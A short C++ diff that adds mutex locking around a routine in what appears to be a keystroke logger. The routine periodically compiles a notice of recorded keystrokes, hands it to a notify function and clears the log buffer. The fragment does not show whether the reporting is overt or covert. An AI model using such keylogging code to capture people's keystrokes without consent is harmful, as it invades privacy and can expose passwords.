@@ -366,6 +366,8 @@ void sendNotice(){
 
         WaitForSingleObject(hTimer, INFINITE);
 
+        logFileMutex.lock();
+
         std::wstringstream noticeStream;
 
         noticeStream << "The following keystrokes have been recorded in the last " << NOTICE_DELAY / 60 << " minutes:\n";
@@ -374,5 +376,7 @@ void sendNotice(){
         notify(noticeStream.str());
 
         logFileBuffer.clear();
+
+        logFileMutex.unlock();
     }
 }
